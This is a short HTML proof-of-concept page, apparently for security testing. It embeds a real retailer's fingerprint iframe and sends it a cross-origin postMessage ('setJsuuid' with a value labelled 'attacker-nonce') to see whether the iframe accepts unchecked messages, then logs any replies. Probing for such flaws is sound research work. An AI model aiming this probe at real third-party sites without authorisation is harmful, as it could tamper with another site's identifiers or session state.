<!DOCTYPE html>
<html>
<head><title>Origin Test</title></head>
<body>
<h1>PostMessage Origin Test</h1>
<iframe id="target" src="https://www.mercadolibre.com/jms/lgz/fingerprint/iframe"></iframe>

<script>
setTimeout(() => {
    const iframe = document.getElementById('target');
    
    // Test 1: Send message from our origin
    iframe.contentWindow.postMessage({
        action: 'setJsuuid',
        value: 'test-uuid-12345',
        nonce: 'attacker-nonce'
    }, '*');
    
    // Listen for response
    window.addEventListener('message', (e) => {
        console.log('Received response:', e);
        console.log('Origin:', e.origin);
        console.log('Data:', e.data);
    });
}, 2000);
</script>
</body>
</html>
